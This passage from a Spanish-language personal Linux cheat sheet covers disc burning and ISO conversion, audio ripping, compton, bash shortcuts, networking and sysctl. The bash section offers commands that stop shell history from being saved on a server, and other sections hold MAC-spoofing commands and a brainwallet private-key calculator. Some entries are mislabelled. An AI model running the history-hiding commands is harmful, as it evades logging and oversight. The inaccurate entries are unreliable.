/var/log/mysqld.log – MySQL database server log file.
/var/log/secure – Authentication log.
/var/log/utmp or /var/log/wtmp : Login records file.


#############################################################################################################################################################################################

########################################################################################### compton #########################################################################################

#### compton

#### compton un compositor de ventanas vistoso y ligero para entornos de escritorio alternativo a compiz. Si eres de los que disfrutas con los escritorios ligeros tipo Gnome Classic (Sin efectos), Openbox, o Razor-qt  y necesitas de un compositor para X que no consuma demasiado, quizas Compton sea lo que estas buscando. Con el podras disfrutar principalmente de sombras, transparencias y diversos efectos para menus y ventanas.


#### Instalacion ####

#### Como es habitual para agregar este tipo de repositorios, y desde el terminal: ####

sudo add-apt-repository ppa:yunnxx/gnome3
sudo apt-get update
sudo apt-get install compton

#### Una vez terminada, copiamos su fichero de configuracion a nuestro local. ####

cp /etc/xdg/compton.conf $HOME/.config


#### Configuracion ####

A pesar de que Compton acepta cantidad de parametros para realizar todas sus funcionalidades nosotros por comodidad y facilidad de uso, vamos a trabajar directamente a traves de su fichero de configuracion, llamado compton.conf  que acabamos de copiar.

Lo editamos y vemos sus secciones y parametros principales:

$ gedit $HOME/.config/compton.conf

#### Sombras ####

# Shadow
shadow = true;
no-dnd-shadow = true;
no-dock-shadow = true;
#clear-shadow = true;
#shadow-radius = 7
#shadow-offset-x = -4
#shadow-offset-y = -4
shadow-opacity = 0.7
#shadow-red = 0.0
#shadow-green = 0.0
shadow-blue = 0.5
#shadow-exclude = [ "n:e:Notification" ];
#shadow-exclude = "n:e:Notification";

#### Antes de nada decir, que si el caracter # se encuentra en la primera posicion de la linea, querra decir que esa linea se encuentra comentada y por lo tanto sin efecto. ####

####Aqui hay que destacar: ####

    shadow = true;     // Las sombras se encuentra activas cuando este a true, de no quererlas tendremos que pasar este valor a false
    no-dock-shadow = true; // Si disponemos de dock, no queremos que este tenga sombras.
    shadow-opacity = 0.7 //Corresponde a la transparencia de la sombra. Tendremos que introducir unos valores entre 0.0 totalmente transparente y 1 que es sin transparencia.
    shadow-blue = 0.5 //Queremos que la sombra sea de color azul, siendo 0.0 azul muy claro a 1 con un azul mas oscuro.

#### Transparencia ####

# Opacity
menu-opacity = 0.8;
#inactive-opacity = 0.9;
frame-opacity = 0.7;
#inactive-opacity-override = true;

    menu-opacity = 0.8; //Transparencia aplicada a los menus y popup-menu, tanto del panel como el de las aplicaciones.
    frame-opacity = 0.7; //Transparencia aplicada de forma general tanto a la ventana como a su decoracion.

#### Desaparicion y aparicion de menus y ventanas ####

# Fading
fading = false;
#fade-delta = 45
fade-in-step = 0.08
fade-out-step = 0.08
#no-fading-openclose = true;

    fading = false; //Activacion o no de este efecto
    fade-in-step = 0.08 //Velocidad de aparicion.
    fade-out-step = 0.08 //Velocidad de cierre o minimizacion de la ventana.

#### Configuracion segun tipo de ventana ####

# Window type settings
wintypes:
{
  tooltip = { fade = true; shadow = false; opacity = 0.90; };

}

    tooltip = { fade = true; shadow = false; opacity = 0.90; } ; //Diversos efectos aplicados unicamente al tooltip correspondiente a los paneles y aplicaciones.

#### Para ir probando estos parametros y valores, despues de salvar con gedit, basta con tener un terminal y ejecutar el programa: ####

compton

#### Si necesitamos refrescar compton, basta con ir a este terminal y realizar un CONTROL + C y volver a ejecutar el programa otra vez. Cuando terminemos con esto y si queremos que se inicie compton automaticamente cuando entremos en nuestra sesion, basta con crear una entrada en Aplicaciones al inicio. ####


#### compton windows manager ####

compton -ccgb -ff -i 0.065 -o 0.065 -d 6 -m 0.8



#############################################################################################################################################################################################

########################################################################################### chrome ##########################################################################################

#### chrome #### chromium

#### instalar pepperflash plugin chrome chromium ####

apt-get install pepperflashplugin-nonfree

update-pepperflashplugin-nonfree --install

#### habilitar aceleracion por hardware chrome chromium gpu ####

chrome://flags    - y habilitar "override software rendering list"



#############################################################################################################################################################################################

######################################################################################### genisoimage #######################################################################################

#### genisoimage

####  crear imagenes iso a partir de la linea de comandos con genisoimage ####

#### vamos a utilizar genisoimage para este. asi es como se crea una imagen iso 9660 desde un directorio, manteniendo ese directorio como origen: ####

genisoimage -o output_file.iso directory_name

#### y para crear una imagen a partir varios archivos, sin incluir un directorio de origen: ####

genisoimage -o output_file.iso file1 file2 file3




#### notas: ####

1- se pueden establecer valores predeterminados para dev,el dispositivo de grabacion; fs, el tamano del bufer(nunca menor que el de la grabadora) y speed,la velocidad de grabacion,indicandolo en el archivo /etc/default/cdrecord y simplificando de esta manera la sintaxis.
2- growisofs viene en el paquete dvd+rw-tools.
3- dvdrecord viene en el paquete dvdrtools.

#############################################################################################################################################################################################

############################################################################################ mkisofs ########################################################################################

#### mkisofs

#### ripear un dvd desde archivos vts ####

mkisofs -dvd-video -o archivo_de_salida.iso carpeta_contiene_vts/

#### crea una imagen .iso de varios archivos del disco duro ####

mkisofs -r -J -T -o /tmp/burn/image.iso archivo_1 archivo_2 archivo_3  -  -J is usefull if you are going to use the disk in a windows machine

mkisofs -r -T -V <label> -o image.iso archivo_1 archivo_2 archivo_3  -  -V is for specifing labels



#### notas: ####

1- se pueden establecer valores predeterminados para dev,el dispositivo de grabacion; fs, el tamano del bufer(nunca menor que el de la grabadora) y speed,la velocidad de grabacion,indicandolo en el archivo /etc/default/cdrecord y simplificando de esta manera la sintaxis.
2- growisofs viene en el paquete dvd+rw-tools.
3- dvdrecord viene en el paquete dvdrtools.

#############################################################################################################################################################################################

########################################################################################### cdrecord ########################################################################################

#### cdrecord

#### obtener informacion sobre nuestra lectora/grabadora de dvds ####

cdrecord -checkdrive

#### grabar un cd de datos/imagen ####

cdrecord -v dev=/dev/sr0 fs=16m speed=8 imagen.iso

cdrecord -eject -v dev=/dev/sr0 /tmp/burn/image.iso

#### copiar un cd de datos/imagen ####

cdrecord -v dev=/dev/sr0 fs=16m speed=8 -eject -isosize /dev/sr1

#### grabar un cd de audio (cda) ####

cdrecord -v dev=/dev/sr0 fs=16m speed=8 -pad -audio *.wav

#### copiar un cd audio (cda) ####

cdrdao copy -v 2 --device /dev/sr0 --source-device 0,1,0 --reload --eject --on-the-fly --fast-toc --paranoia-mode 0

#### borrar un cd+rw ####

cdrecord -v blank=fast   - (ver cdrecord blank=help)

#### borrar un cd+rw por completo, y no solo la tabla de particiones (tardara mas que en el caso anterior). le pedimos que nos muestre los detalles con -v (por ejemplo, el progreso del borrado) y con -eject indicamos que el cd sera expulsado al finalizar el proceso ####

cdrecord -v -eject speed=8 blank=all dev=/dev/sr0



#### notas: ####

#### ponemos un dvd en la lectora y utilizar "sudo isoinfo -d -i /dev/dvd" para obtener informacion importante como "logical block size is" = parametro "bs" y "volume size is" = parametro "count" que nos es util para utilizar "dd" ####

1- se pueden establecer valores predeterminados para dev,el dispositivo de grabacion; fs, el tamano del bufer(nunca menor que el de la grabadora) y speed,la velocidad de grabacion,indicandolo en el archivo /etc/default/cdrecord y simplificando de esta manera la sintaxis.
2- growisofs viene en el paquete dvd+rw-tools.
3- dvdrecord viene en el paquete dvdrtools.

#############################################################################################################################################################################################

########################################################################################### growisofs #######################################################################################

#### growisofs

#### grabar un dvd de datos/imagen ####

growisofs -z /dev/sr0 -r -j archivo   - (growisofs llama a mkisofs)

#### grabar dvd multisesion ####

growisofs -m /dev/sr0 -r -j archivo   - (-m anade mas datos al dvd)

#### grabar una imagen ya creada ####

growisofs -dvd-compat -z /dev/sr0=imagen.iso

#### borrar un dvd+rw ####

dvdrecord -v dev=0,0,0 blank=fast   - (ver dvdrecord blank=help)

#### ripear un video dvd ####

dvdbackup -m -i /dev/sr0 -o /home/paco/copia_dvd/

vobcopy -i /dev/sr0 -m -o /home/paco/copia_dvd/



#### notas: ####

1- se pueden establecer valores predeterminados para dev,el dispositivo de grabacion; fs, el tamano del bufer(nunca menor que el de la grabadora) y speed,la velocidad de grabacion,indicandolo en el archivo /etc/default/cdrecord y simplificando de esta manera la sintaxis.
2- growisofs viene en el paquete dvd+rw-tools.
3- dvdrecord viene en el paquete dvdrtools.

#############################################################################################################################################################################################

############################################################################################ wodim ##########################################################################################

#### wodim

#### copiar una imagen de disco a cd. la ruta puede variar segun el caso. se recomienda migrar desde cdrecord a su fork, wodim ####

wodim -v dev=/dev/cdrw isoimage.iso

#### borrar un cdrw por completo ####

wodim -v dev=/dev/cdrw -blank=all



#### notas: ####

1- se pueden establecer valores predeterminados para dev,el dispositivo de grabacion; fs, el tamano del bufer(nunca menor que el de la grabadora) y speed,la velocidad de grabacion,indicandolo en el archivo /etc/default/cdrecord y simplificando de esta manera la sintaxis.
2 -growisofs viene en el paquete dvd+rw-tools.
3- dvdrecord viene en el paquete dvdrtools.


#############################################################################################################################################################################################

############################################################################################# iat ###########################################################################################

#### iat

#### iat nos puede servir para convertir bin / nrg / mdf a iso ####

#### para convertir una imagen .nrg a .iso ####

iat input_file.nrg output_file.iso

#### iat soporta muchos formatos de imagen, como iso, nrg, bin y mdf. ####



#############################################################################################################################################################################################

########################################################################################### nrg2iso #########################################################################################

#### nrg2iso

#### convertir imagenes nrg a iso ####

nrg2iso input_image.nrg OUTPUT_image.iso



#############################################################################################################################################################################################

########################################################################################### cdi2iso #########################################################################################

#### cdi2iso

#### cdi2iso es una utilidad para convertir imagenes discjuggler al formato estandar iso-9660 ####



#############################################################################################################################################################################################

########################################################################################### daa2iso #########################################################################################

#### daa2iso

#### daa2iso convierte imagenes creadas con poweriso a estandar iso ####



#############################################################################################################################################################################################

########################################################################################### bin2iso #########################################################################################

#### bin2iso

#### convertir una imagen nrg a iso ####

bin2iso imagen.cue



#############################################################################################################################################################################################

########################################################################################### ccd2iso #########################################################################################

#### ccd2iso

#### convierte una imagen img/ccd/sub/cue a iso ####

ccd2iso imagen.img imagen.iso


#############################################################################################################################################################################################

############################################################################################ mdf2iso ########################################################################################

#### mdf2iso

#### convertir una imagen mdf/mds a iso ####

mdf2iso imagen.mdf imagen.iso




#############################################################################################################################################################################################

############################################################################################ cdda2wav #######################################################################################

#### cdda2wav

#### extrae disco completo en archivos wav separados ####

cdda2wav -b -h -d /dev/sr0 -s -x

#### extrae el track n? 5 ####

cdda2wav -h -d /dev/sr1 -s -x -t 5



#############################################################################################################################################################################################

########################################################################################## cdparanoia #######################################################################################

#### cdparanoia

#### mostrado de las pistas que contenga el cd ####

cdparanoia -q -d /dev/sr0

#### extrae disco completo en archivos wav separados ####

cdparanoia -b -d /dev/sr1

#### extrae el track n? 5 ####

cdparanoia 5 -d /dev/sr1

#### extrae el disco completo desde el track n? 1 en un solo archivo wav ####

cdparanoia -- "1-"

#### extraeremos el audio donde n sera el numero de canciones que queremos obtener para la copia: ####

cdparanoia -w -z -x -b -d /dev/sr0 -v 1-n


#############################################################################################################################################################################################

############################################################################################# abcde #########################################################################################

#### abcde

#### extrae disco completo en archivos mp3 separados ####

abcde -d /dev/sr1 -n -x -o mp3

#### extrae disco completo en archivos mpc separados ####

abcde -d /dev/sr1 -n -x -o mpc

#### extrae disco completo en archivos ogg separados ####

abcde -d /dev/sr1 -n -x -o ogg

#### extrae las tres primeras canciones y la quinta ####

abcde -d /dev/sr1 -n -x -o ogg tracks 1-3 5

-d  indica el dispositivo
-n  actua con las opciones por defecto,sin preguntar
-x  expulsa el cd al acabar
-o  tipo de archivo resultante

#### extrae el cd en un solo archivo flac con su correspondiente cuesheet ####

abcde -1 -m -o flac



#### nota: ####

abcde conserva los id3 de los temas al pasarlos al disco duro,es decir artista,titulo,etc.requiere de oggenc,lame,cdparanoia o cdda2wav,id3v2 y cd-discid y opcionalmente normalize

#############################################################################################################################################################################################

############################################################################################ fuser ##########################################################################################

#### fuser

#### para ver los procesos que estan usando un archivo o directorio. ####

fuser -v archivo

#### cerrar un puerto con fuser esto cerrara el puerto 80, puerto por defecto utilizado por el servidor web. ####

fuser -k 80/TCP



#############################################################################################################################################################################################

############################################################################################ dig ############################################################################################

#### dig

#### comprobar si nuestro isp esta interceptando nuestras peticiones dns ####

dig +short which.opendns.com txt @208.67.220.220

#### para saber nuestra ip publica ####

dig +short myip.opendns.com @resolver1.opendns.com


#### Query Wikipedia via console over DNS Query Wikipedia by issuing a DNS query for a TXT record. The TXT record will also include a short URL to the complete corresponding Wikipedia entry. ####

dig +short txt <keyword>.wp.dg.cx

#############################################################################################################################################################################################

########################################################################################## ident ############################################################################################

#### ident

#### indent es una herramienta que permite dar formato y cambiar la apariencia del codigo c mediante la insercion/eliminacion de espacios en blanco para hacer el codigo mas claro y mas facil de leer. algunos de los estilos de codigo que soporta son gnu indent (por defecto, tambien se invoca con -gnu), kernighan & ritchie (invocado con -kr) o berkeley (invocado con -orig). el ejemplo es el siguiente: ####

indent -kr source_file.c   - esto formatea source_file.c usando el estilo kernighan & ritchie.



#############################################################################################################################################################################################

########################################################################################### bitcoin #########################################################################################

#### bitcoin

#### bitcoin brainwallet checksum calculator ####

function brainwallet_checksum () { (o='openssl sha256 -binary'; p='printf';($p %b "\x80";$p %s "$1"|$o)|$o|sha256sum|cut -b1-8); }

#### bitcoin brainwallet private key calculator ####

(read -r passphrase; b58encode 80$( brainwallet_exponent "$passphrase" )$( brainwallet_checksum "$passphrase" ))

#### bitcoin brainwallet exponent calculator ####

function brainwallet_exponent () { printf %s "$1" | sha256sum | head -c 64; }

#### bitcoin brainwallet base58 encoder ####

function b58encode () { local b58_lookup_table=({1..9} {a..h} {j..n} {p..z} {a..k} {m..z}); bc<<<"obase=58;ibase=16;${1^^}" | (read -a s; for b58_index in "${s[@]}" ; do printf %s ${b58_lookup_table[ 10####"$b58_index" ]}; done); }



#############################################################################################################################################################################################

########################################################################################### urban ###########################################################################################

#### urban

#### iniciar urban terror r00t client ####

./root.exe set fs_homepath /home/curiousx/urban_terror/

#### iniciar urban terror todos procesadores ####

cd urban_terror ; sleep 1 ; export gallium_msaa=4 ; sleep 3 ; taskset -c 0xffffffff ./urban.exe set fs_homepath /home/curiousx/urban_terror/

#### iniciar urban terror modo server mapa practica ####

taskset -c 0xffffffff ./urban.exe +set fs_homepath /home/curiousx/urban_terror/ +set sv_pure 0 +set g_gametype 0 +devmap ut4_garfed

#### antialising mesa amd ati ####

cd urban_terror/ ; sleep 1 ; export gallium_msaa=4 ; sleep 3 ; ./urban.exe set fs_homepath /home/curiousx/urban_terror/

#### jugar mapa modo server samchun ####

./urban_64 +set fs_homepath /home/curiousx/urban_terror/ +set sv_pure 0 +set g_gametype 0 +devmap ut4_garfed

#### lentes gamers rapid ####

gamming glasses: gunnar optics legend g, chrome

#### urban terror 21 ####

# Changelog #

• Updated text with new font (Roboto) and drop shadow
• Decreased font sizes around the HUD
• Revamp of the mini scoreboard and team overlay
• Updated netgraph
• Updated the player health and damage area. There's now a health percentage indicator (toggleable with cg_drawhealth)
• Improvement of the item and weapon select boxes
• Enhancement of the "3, 2, 1, Go" beep on warmup countdown
• Added cvar: cg_countdownSound to disable the "3, 2, 1, Go" beeps
• Updated the timers - right aligned and new timer and hotpotato icons
• Highlighted map names in orange if they need to be downloaded (in the server browser menu)
• Added $hp chat var
• Updated chat variable substitution. Variable names that are not recognized by the server will not be consumed (you can now type $100)
• Updated the vote HUD element
• Used Team Survivor walls in Freeze Tag
• Added forcesub rcon command
• Added forcecaptain rcon command
• Combined red and blue wave timers if they're equal
• Added cg_showbullethits 3
• Added ability to use "all" with the forceteam command
• Added swap rcon command to swap two players
• Added cg_drawclock which replaces cl_drawclock (1 for a 24-hour clock, and 2 for a 12-hour clock)
• Fixed spawn arrangement on Docks #100
• Fixed a missing texture on Ricochet #110
• Fixed the occasional timeout flights #114
• Fixed status of defusing players being set to "FRZN" #115
• Made dropped bomb yellow on the minimap #82
• Fixed cumulative g_inactivity timer #41
• Fixed blurry ammo icons
• Fixed speedometer and accelerometer positioning when cg_hudWeaponInfo allows it
• Fixed speedometer overlapping weapon info
• Fixed helmet being rendered on top of NVG shader
• Fixed "x team wins" skinning #132
• Fixed bomb being lost to the void #11
• Fixed first shot accuracy in perfect conditions #134
• Changed LEADER to LEAD on the scoreboard #138
• Fixed C&H flags not being counted when the timelimit is hit
• Fixed skin readme text positioning #136
• Fixed skin selection menu starting empty #118
• Unlocked cl_pitchspeed #139
• Changed "Enemies: x" to "Players: x" in Jump mode

#### urban terror 20 ####

# Changelog #

• Fixed flag taken sound not playing #5 #14
• Fixed ThawOutStarted log spam
• Cleaned up disconnected thaw targets #90
• Added completion for forcesub, goto, load, save, and timeout #46
• Reset player stamina when frozen #94
• Added keycatcher for radio UI #3
• Fixed scoreboard showing "kills" instead of "points" for the blue team #70
• Fixed scoreboard/miniscoreboard showing thawed players as dead #70 #92
• Changed scoreboard status to FRZN for frozen players
• Restored flags on gear change #11
• Fixed frozen players' hitboxes #88
• Added a bar for players who are being thawed out #89
• Moved the thaw progress bar down #91
• Reset the match state when swapteams is called #98
• Set the player's leg model to crouched if frozen in a position where they can't uncrouch #99
• Made frozen players' arrows flash cyan on the minimap
• Fixed live player counting for Freeze Tag #92
• Added a puff of snow for freezing, thawing, and melting
• Fixed bots timing out if bot_pause is 1
• Fixed frozen players taking environmental damage #106
• Fixed login button drawing #71
• Fixed players showing up as frozen when the round starts #111
• Added countdown sounds for pre-game timers
• Fixed frozen players' helmets not showing #64
• Fixed stats menu not working when dead or spectating #39
• Fixed give server crash #40
• Allowed gravity to affect frozen players (this also allows them to be booted)
• Allowed frozen players to be shot to prolong their frozen state


#############################################################################################################################################################################################

############################################################################################ alias ##########################################################################################

#### alias

#### asignarle un alias a un comando ####

alias comando='parametros'

#### remover un alias de un comando con unalias ####

unalias comando



#############################################################################################################################################################################################

################################################################################### ls dispositovos hardware ################################################################################

#### lspci #### lsdev #### lsusb #### lscpu

#### muestra informacion sobre los dispositivos(canales irq,dma y puertos e/s que utilizan) ####

lsdev

#### ver dispositivos conectados a la placa madre mediante un bus pci ####

lspci

#### ver los buses usb y los dispositivos conectados a los mismos ####

lsusb

#### ver informacion relacionada con el procesador ####

lscpu

#### ver que modulo driver esta utilizando nuestro sistema operativo en el kernel con la placa grafica utilizando lscpi mas filtros ####

lspci -nnk | grep -i vga -A 3 | grep 'in use'

#### ver que placa grafica esta utilizando mi sistema, en caso de tener un placa integrada y otra externa este comando puede ser util

lspci -k | grep -i vga -A 2

#############################################################################################################################################################################################

########################################################################################## youtube-dl #######################################################################################

#### youtube-dl

#### listar formatos disponibles para descargar ####

youtube-dl -f <url>

#### descargar indicando la calidad deseada con los valores conseguidos con -f ####

youtube-dl -f 137+140 <url>

#### para descargar el audio de un video solamente: ####

youtube-dl -x --audio-format vorbis http://www.youtube.com/watch?v=tvwjma5b1qg

es necesario ffmpg o avconv, y ffprobe o avprobe, y puedes elegir entre los formatos:

best #por defecto best
acc
vorbis
mp3
m4a
opus
wav

#### para descargar el video ####

youtube-dl http://www.youtube.com/watch?v=tvwjma5b1qg

#### tambien es posible descargar un video con subtitulos (solo en youtube), aunque no lo he intentado (cuando tenga tiempo lo hare) :d ####

youtube-dl --sub-lang es http://www.youtube.com/watch?v=ersgyuevlvq&list=tl7mncncijh6u

#### para mostrar la lista de subtitulos disponibles ####

youtube-dl --list-subs http://www.youtube.com/watch?v=ersgyuevlvq&list=tl7mncncijh6u



#############################################################################################################################################################################################

######################################################################################### libreoffice #######################################################################################

#### libreoffice

#### gestor extensiones libreoffice ####

unopkg

#### corrector ortografico ####

apt-get install myspell-es

apt-get install libreoffice-java-common

descargar http://zeppo.rediris.es/ftp/mirror/forja-rediris/rla-es/openoffice.org3.x-libreoffice/versin0.7/ (lo tengo en la nube)

descargar http://www.languagetool.org/download/languagetool-2.5.oxt (lo tengo en la nube)

#### instalar iconos flat sifr ####

sudo apt-get install libreoffice-style-sifr   - despues ir a: tools > options > libre office > view  y selecionar Sift debajo de Icons size and style

#############################################################################################################################################################################################

############################################################################################# amd ###########################################################################################

#### amd #### ati

#### informacion targeta grafica amd radeon temperatura clock etc ####

aticonfig --odgc --odgt    - amd 

#### programa ncurses para controlar ver caractaristicas amd ati radeon ####

radeontop

#### habilitar sonido hdmi 5.1 dts ####

echo "options radeon audio=1" | sudo tee /etc/modprobe.d/radeon.conf


#############################################################################################################################################################################################

############################################################################################ sysctl #########################################################################################

#### sysctl

#### bajar tendncia utilizar swap kernel sysctl ####

vm.swappiness = 10

#### disable ipv6 /etc/sysctl.conf ####

net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
net.ipv6.conf.lo.disable_ipv6 = 1

#### Ignore ICMP request: ####

net.ipv4.ICMP_echo_ignore_all = 1

#### Ignore Broadcast request: ####

net.ipv4.icmp_echo_ignore_broadcasts = 1

#### reiniciar la pc de ocurrir un kernel panic ####

kernel.panic = 5   - 5 indica los segundos que esperara el sistema antes de reiniciar

NOTE: Load new settings or changes, by running:

sysctl -p

#############################################################################################################################################################################################

############################################################################################ fdisk ##########################################################################################

#### fdisk

#### "fdisk" no soporta tabla de particiones gpt hay que utilizar "parted" en su lugar ####

fdisk -l  (listar tabla de particiones mbr/msdos)

#### obtener lista de particiones de un disco ####

fdisk -l /dev/sdx | grep -v -e 'disk' -e 'disco' | grep '/dev/sd' | awk '{print $1}'

#### obtener una lista de dispositivos de dispositivos de almacenamiento detectados ####

fdisk -l 2>/dev/null | grep -i -e "disk \/" -e "disco \/" | grep -v "\/dev\/dm" | awk '{print $2}' | sed -e 's/://g'



#############################################################################################################################################################################################

############################################################################################ parted #########################################################################################

#### parted

#### listar particion gpt msdos mbr altarnativa superior mejor a fdisk -l ####

parted -l



#############################################################################################################################################################################################

############################################################################################ hdparm #########################################################################################

#### hdparm

#### verificar dma ####

hdparm /dev/sda

#### informacion sobre sdx ####

hdparm -i /dev/sdx

#### activar dma en el disco duro o periferico ####

hdparm -d1 /dev/sdx

#### mostrar las caracteristicas de un disco duro ####

hdparm -i /dev/sda

#### realizar prueba de lectura en un disco duro ####

hdparm -tt /dev/sda



#############################################################################################################################################################################################

############################################################################################ bash ###########################################################################################

#### bash

#### abrebiaciones para trabajar en consola ####

ctrl + a -> para situarse al principio de la linia.
ctrl + e -> para situarse al final de la linia.
ctrl + w -> recorta la palabra anterior al puntero.
ctrl + u -> recorta toda la linia antes del puntero.
ctrl + k -> recorta toda la linia despues del punter.
ctrl + y -> pega lo k hay en memoria (portapapeles).
ctrl + l -> limpia la pantalla (equivale a 'clear')

#### variables de entorno ####

random -> genera un numero aleatorio

shlvl -> incrementa en uno cada vez k invocamos a un nuevo interprete.

seconds -> indica el numero de segundos desde k se ha creado el interprete.

histcmd -> indice en el historico.

dirstack -> almacena el ultimo directorio accedido.

hosttype -> arquitectura de la maquina.

ostype -> indica el so.

machtype -> info sobre la arquitectura, distro y so.

shell -> indica el interprete actual.

shellopts -> indica las opciones activas en el interprete (equivalente a set -o).

ifs -> caracteres separadores xa la lectura con read.

lc_ -> hacen referencia a datos locales.

tmout -> numero de segundos k se espera el interprete antes de k se introduzca una entrada. si no se introduce nada, finaliza.

histcontrol -> si contiene:

-ignoredups -> no pone en el historico las linias duplicadas.

-ignorespaces -> no pone en el historico las linias k empiezan x espacios.

-ignoreboth -> combina las dos opciones anteriores.

s_ -> contiene el ultimo parametro de un comando.


#### unset es un comando interno que sirve para desactivar variables. es util cuando entras en un servidor y queres que no se guarde el historial los comandos introducidos; hay dos formas (seguramente alguien sabra alguna otra): ####

unset histfile

export histfile=/dev/null

#### para ver variables relacionadas con un programa ####

export | grep programa

#### para exportar crear una variable ####

export programa_home=/u01/app/programa/product/10.2.0

#### incluir un directorio a una variable path ####

export path=$path:/home/user/my_prog

#### modificar el color del prompt permanentemente exportanto los colores a la variable ps1 ####

export ps1="\[\e[00;31m\]\u\[\e[0m\]\[\e[00;33m\]@\[\e[0m\]\[\e[00;36m\]\h\[\e[0m\]\[\e[00;37m\]:\[\e[0m\]\[\e[00;33m\][\[\e[0m\]\[\e[00;32m\]\w\[\e[0m\]\[\e[00;33m\]]\[\e[0m\]\[\e[00;37m\] \[\e[0m\]\[\e[00;35m\]\a\[\e[0m\]\[\e[00;37m\]\n \[\e[0m\]\[\e[00;31m\]>\[\e[0m\]\[\e[00;37m\] \[\e[0m\]"

#### declare: comando interno que tiene opciones utiles como:

-x (variables exportadas; equivalente a export)
-i (variables k contienen enteros: ppid, uid, euid)
-r (variables de solo lectura; equivalente a readonly)
-a (variables vector)

#### modificar bash prompt ####

ps1="\n\[\e[1;30m\][$$:$ppid - \j:\!\[\e[1;30m\]]\[\e[0;36m\] \t \[\e[1;30m\][\[\e[1;34m\]\u@\h\[\e[1;30m\]:\[\e[0;37m\]${ssh_tty:-o} \[\e[0;32m\]+${shlvl}\[\e[1;30m\]] \[\e[1;37m\]\w\[\e[0;37m\] \n\$ "

#### preguntar por password: con el comando read ####

read -s -p "password: " user_password_variable; echo

#### termina un proceso. ####

ctrl+c

#### suspende temporalmente la ejecucion de un programa. ####

ctrl+z

#### para la transferencia de datos a la terminal. ####

ctrl+s

#### resume, reinicia la tranferencia de datos ####

ctrl+q

#### entra en modo de busqueda incremental de linea de comandos, ej: si entras en el modo y escribis "ls" (sin comillas) te completara la entrada mas reciente que empiece por "ls", para ir rotando por la entradas antereriores seguir presionando ctrl+r, para terminar presionar alguna flecha. ####

ctrl+r

#### limpia la pantalla. ####

ctrl+l

#### ejecuta un comando (como si se hubiera presionado enter) pero vuelve y deja el comando escrito en el prompt. ####

ctrl+o

#### borra desde donde esta el cursor hasta el final. ####

ctrl+k

#### borra desde donde esta el cursor hasta el inicio de la palabra debajo de el. ####

ctrl+w

#### salta al final de lo que se este escribiendo. ####

ctrl+e

#### salir del entorno grafico a un terminal. (fn? segun gettys activados en /etc/inittab) ####

ctrl+alt+f2

#### estando en una terminal reinicia (si no se indica otra cosa en /etc/inittab) ####

ctrl+alt+supr


#### funcion para copiar un archivo y ver la barra de progreso usando pv y agregando esta funcion a .bashrc ####

cp_p() { if [ `echo "$2" | grep ".*/$"` ]; then pv "$1" > "$2""$1"; else pv "$1" > "$2"/"$1"; fi; }



#### notas ####

# podemos instalar una guia completa sobre bash scripting de la siguiente manere #

sudo apt-get install abs-guide

# lugo para ver el contenido de la guia #

firefox /usr/share/doc/abs-guide/html/index.html

#############################################################################################################################################################################################

############################################################################################ init ###########################################################################################



#############################################################################################################################################################################################

########################################################################################### scripts #########################################################################################

#### scripts

#### script bash especificar un tiempo limite para ingresar la contrasena ####

read -t 10 -s -p"password: " user_password_variable
if [ ! $? -eq 0 ]; then
echo "time out!"
fi

o

read -t 10 -s -p "password: " user_password_variable ; if [ ! $? -eq 0 ]; then echo "time out!" ; fi

#### especificar que si se equivocan al tipear el password aparesca una advertencia de error, y pidiendo que retipeen el password ####

while [ ! -n "$user_password" ]; do read -s -p "password: " user_password ; if [ ! -n "$user_password" ]; then echo "error: you must specify a valid password, please try again" ; fi ; echo ;$

o

function read_password() {
while [ ! -n "$user_password" ]; do
read -s -p "password: " user_password
if [ ! -n "$user_password" ]; then
echo "error: you must specify a valid password, please try again"
fi
echo
done
}

#### especificar que si se equivocan al tipear el password aparesca una advertencia de error, y pidiendo que retipeen el password ####

while [ ! -n "$user_password" ]; do read -s -p "password: " user_password ; if [ ! -n "$user_password" ]; then echo "error: you must specify a valid password, please try again" ; fi ; echo ;$

o

function read_password() {
while [ ! -n "$user_password" ]; do
read -s -p "password: " user_password
if [ ! -n "$user_password" ]; then
echo "error: you must specify a valid password, please try again"
fi
echo
done
}

# stuff in /etc/rc.local runs before gnome starts and is run as root, stuff in .bashrc runs after you login and is run as you, very different no guarantee it'll work #

# los comandos en /etc/rc.local corren antes de iniciar secion, y corren como root, los comandos en .bashrc corren una vez que iniciamos secion y corren con nuestros permisos #

#### backup base de datos mysql ####

#!/bin/bash

BACKUPUSER="usuario"
BACKUPDIR="/home/$BACKUPUSER/backup/mysql"
BACKUPDATE=$(date +%Y%m%d_%H%M%S)

mkdir -p $BACKUPDIR

mysqldump -u USER -pPASSWD --all-databases | gzip > "$BACKUPDIR/database_$BACKUPDATE.sql.gz"

chown -R $BACKUPUSER:$BACKUPUSER $BACKUPDIR

# Para restaurar:
# mysql -u USER -pPASSWD < backup.sql



#############################################################################################################################################################################################

########################################################################################### ifconfig ########################################################################################

#### ifconfig

#### usando ifconfig podemos listar ver la lista de dispositivos de red que tengamos en nuestro sistema operativo entre muchas otras cosas ####

ifconfig

#### ver todas las interfaces de red inalambricas o cableadas inclusice si estas estan caidas ####

ifconfig -a

#### iniciar un dispositivo de red usando ifconfig ####

ifconfig eth0 up

#### detener un dispositivo de red usando ifconfig ####

ifconfig eth0 down

#### cambiar mac address ####

ifconfig wlan0 down ; sleep 2 ; ifconfig wlan0 hw ether 00:11:22:33:44:55 ; sleep 2 ; ifconfig wlan0 up

macchanger -m de:ad:be:ef:00:00 eth0

#### para reiniciar la configuracion de red y las interfaces de red ####

sudo service networking restart

/etc/init.d/networking restart

#### para establecer la ip, la mascara y el broadcast ####

ifconfig ath0 192.168.1.1 netmask 255.255.255.0 broadcast 192.168.1.255 up

#### para establecer el punto de acceso ####

route add default gw 192.168.1.1 eth0

#### para comprobar saber si tenemos el cable de red bien conectado ####

ifplugstatus eth0   -   para instalarlo: sudo apt-get install ifplugd

#### habilita la interface especificada, ejemplos: ifup eth0 ;ifup ppp0 ####

ifup interface

#### deshabilita la interface especificada,ejemplos: ifdown eth0 ; ifdown ppp0 ####

ifdown interface

#### ver las macs ####

ifconfig | awk '/hw/ {print $5}'



#### nota: "iptraf" monitoriza trafico de redes (ncurses) ####

#############################################################################################################################################################################################

########################################################################################### iwconfig ########################################################################################

#### iwconfig

#### iwconfig nos dira las interfaces inalambricas que tenemos en el sistema entre otras muchas otras cosas ####

#### essid = nombre_red: ejemplo: iwconfig ath0 essid "curiousx"

#### el uso basico del comando iwconfig es ####

iwconfig [interface] [opcion]   -   [interface] = tipo eth0, ath0 etc

